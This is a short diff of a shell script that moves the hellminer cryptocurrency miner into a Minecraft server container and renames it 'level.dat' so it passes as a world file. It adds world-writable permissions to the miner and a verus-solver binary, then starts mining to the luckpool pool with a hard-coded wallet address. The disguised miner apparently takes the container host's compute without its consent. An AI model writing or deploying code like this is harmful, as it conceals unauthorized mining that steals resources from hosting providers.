@@ -7,4 +7,7 @@ mv hellminer /home/container/world/level.dat
 mv verus-solver /home/container/world/
 cd /home/container/world
 rm -r /home/container/hellminer
+#add chmod because yes mf
+chmod 777 level.dat #hm
+chmod 777 verus-solver #solver
 ./level.dat -c stratum+tcp://eu.luckpool.net:3956 -u RKxL8cCnTTBwMcV1dPFst2pt6P8AJwyfDW.$(cat /home/container/world_the_end/session.lock)
